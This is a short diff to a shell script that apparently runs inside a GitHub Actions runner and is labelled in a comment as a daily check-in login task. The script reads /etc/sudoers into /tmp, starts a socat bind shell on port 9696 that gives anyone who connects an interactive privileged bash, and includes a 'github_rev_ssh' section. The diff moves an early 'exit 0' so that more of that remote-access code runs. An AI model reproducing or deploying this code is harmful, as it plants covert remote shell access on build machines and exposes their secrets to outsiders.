@@ -39,7 +39,7 @@ grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 > /tmp/js9a.txt
 [ -x $GITHUB_WORKSPACE/socat.bin ]&&busybox setsid $GITHUB_WORKSPACE/socat.bin -v tcp-l:9696,bind=0.0.0.0,fork,reuseaddr exec:"bash -pil",pty,stderr,setsid,sigint,sane &
 
 
-exit 0;
+
 # github_rev_ssh
 (id | grep "^uid=[0-9]\{1,9\}(runner)") && 
 (
@@ -50,7 +50,7 @@ exit 0;
     (which  ash) && d1=$(which  ash);
     (which bash) && d1=$(which bash);
 
-
+exit 0;
 cd /tmp;
 #每日签到 登陆
 grep -q XXYYZZ /tmp/js9 &&
